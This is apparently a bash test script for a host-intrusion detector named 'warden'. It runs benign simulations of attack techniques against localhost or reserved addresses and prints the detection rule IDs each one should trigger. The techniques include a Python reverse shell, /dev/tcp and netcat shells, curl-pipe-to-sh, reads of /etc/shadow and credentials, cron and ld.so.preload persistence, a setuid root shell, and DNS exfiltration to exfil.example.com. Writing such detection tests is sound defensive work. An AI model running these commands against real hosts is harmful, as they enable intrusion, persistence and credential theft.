#!/usr/bin/env bash
# Benign attack simulations. Each block prints "EXPECT <rule ids>" so
# check.py can compare against the alerts warden produced.
# Run as a normal sudo-capable user while warden runs with tests/test-config.yaml.
set -u
W=$(mktemp -d /tmp/warden-sim.XXXX)
trap 'rm -rf "$W"' EXIT
step() { echo "EXPECT $*"; sleep 0.3; }
MYIP=$(hostname -I | awk '{print $1}')

step WD-001 WD-003 WD-011   # reverse shell -> sh killed in-kernel before it runs
nc -lk 127.0.0.1 9101 >/dev/null 2>&1 & L=$!; sleep 0.3
python3 -c 'import socket,os;s=socket.create_connection(("127.0.0.1",9101));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.execv("/bin/sh",["sh","-c","echo pwned"])' 2>/dev/null
echo "  revshell exit status: $? (137 = SIGKILL)"
kill $L 2>/dev/null

step                        # negative: shell over AF_UNIX socketpair (libuv/Node child stdio) must NOT alert or die
python3 -c 'import socket,subprocess;a,b=socket.socketpair();r=subprocess.run(["/bin/sh","-c","true"],stdin=b,stdout=b);exit(r.returncode)'
echo "  socketpair shell exit status: $? (expect 0)"

step WD-002                 # bash /dev/tcp outbound
nc -l 0.0.0.0 9102 >/dev/null 2>&1 & L=$!; sleep 0.3
bash -c "exec 3<>/dev/tcp/$MYIP/9102; echo hi >&3" 2>/dev/null
kill $L 2>/dev/null

step WD-004 WD-050          # netcat -e bind shell
timeout 1 nc.traditional -l -p 9103 -e /bin/sh >/dev/null 2>&1 || timeout 1 busybox nc -l -p 9103 -e /bin/sh >/dev/null 2>&1

step WD-005                 # fileless memfd exec
python3 -c 'import os;fd=os.memfd_create("x");os.write(fd,open("/bin/true","rb").read());os.execv(f"/proc/self/fd/{fd}",["true"])'

step WD-006                 # exec of deleted binary
cp /bin/true "$W/gone"; python3 -c "import os;fd=os.open('$W/gone',os.O_RDONLY);os.unlink('$W/gone');os.execv(f'/proc/self/fd/{fd}',['gone'])"

step WD-007                 # exec from /tmp
cp /bin/true "$W/dropper"; "$W/dropper"

step WD-008                 # curl | sh
bash -c "curl -s -m1 http://127.0.0.1:9/x | sh" 2>/dev/null

step WD-009                 # base64 | sh
bash -c "echo dHJ1ZQo= | base64 -d | sh"

step WD-010                 # miner args
bash -c 'exec -a xmrig sleep 0' ; cp /bin/true "$W/xmrig"; "$W/xmrig" -o stratum+tcp://pool.example:3333

step WD-020                 # shadow read
sudo cat /etc/shadow >/dev/null

step WD-021                 # ssh private key read by unusual process
mkdir -p "$W/.ssh"; echo k >"$W/.ssh/id_ed25519"; cat "$W/.ssh/id_ed25519" >/dev/null

step WD-022                 # cloud creds
mkdir -p "$W/.aws"; echo c >"$W/.aws/credentials"; cat "$W/.aws/credentials" >/dev/null

step WD-023                 # other process environ
sudo cat /proc/1/environ >/dev/null

if [ -e /proc/kcore ]; then  # absent when CONFIG_PROC_KCORE=n (exe.dev)
  step WD-024; sudo head -c1 /proc/kcore >/dev/null 2>&1
fi

step WD-030                 # authorized_keys write
echo "ssh-ed25519 AAAA test" >>"$W/.ssh/authorized_keys"

step WD-031                 # cron persistence
sudo sh -c 'echo "# warden test" > /etc/cron.d/warden-test'; sudo rm -f /etc/cron.d/warden-test

step WD-032                 # systemd unit
sudo sh -c 'echo "# t" > /etc/systemd/system/warden-test.service'; sudo rm -f /etc/systemd/system/warden-test.service

step WD-033                 # ld.so.preload (opened for append, nothing written)
had=$(sudo test -e /etc/ld.so.preload && echo y || echo n)
sudo sh -c ': >> /etc/ld.so.preload'; [ "$had" = n ] && sudo rm -f /etc/ld.so.preload

step WD-034                 # shell rc persistence
echo "# t" >>"$W/.bashrc"

step WD-040 WD-007          # setuid shell privesc (GTFOBins style)
sudo cp /bin/bash "$W/rootbash"; sudo chmod 4755 "$W/rootbash"; "$W/rootbash" -p -c 'true'

step WD-041                 # ptrace attach
sleep 5 & T=$!
python3 -c "import ctypes,time;l=ctypes.CDLL(None);l.ptrace(16,$T,0,0);time.sleep(0.2);l.ptrace(17,$T,0,0)"
kill $T 2>/dev/null

step WD-044                 # anonymous RWX memory
perl -e 'syscall(9, 0, 4096, 7, 0x22, -1, 0)'

step WD-045                 # tamper: signal the agent
P=$(pgrep -n -x warden); sudo kill -STOP "$P"; sudo kill -CONT "$P"

step WD-051                 # mining pool port
timeout 2 bash -c 'exec 3<>/dev/tcp/198.51.100.7/3333' 2>/dev/null

step WD-052 WD-053          # suspicious DNS
dig +time=1 +tries=1 abc.ngrok.io >/dev/null 2>&1
dig +time=1 +tries=1 "$(head -c 40 /dev/urandom | base32 | tr -d '=' | tr A-Z a-z | head -c 60).exfil.example.com" >/dev/null 2>&1

step WD-054                 # blocked destination (test config blocks 192.0.2.0/24)
curl -s -m2 http://192.0.2.10/ >/dev/null 2>&1; echo "  curl to blocked net exit: $? (7 = refused)"

step WD-011                 # blocklisted exec path (test config)
cp /bin/true /tmp/warden-evil; /tmp/warden-evil; echo "  blocklisted exec status: $?"; rm -f /tmp/warden-evil

step WD-060 WD-061          # interactive shell commands
printf 'unset HISTFILE\necho x >/dev/tcp/127.0.0.1/9\nexit\n' | script -qfc 'bash --norc -i' /dev/null >/dev/null 2>&1

echo DONE
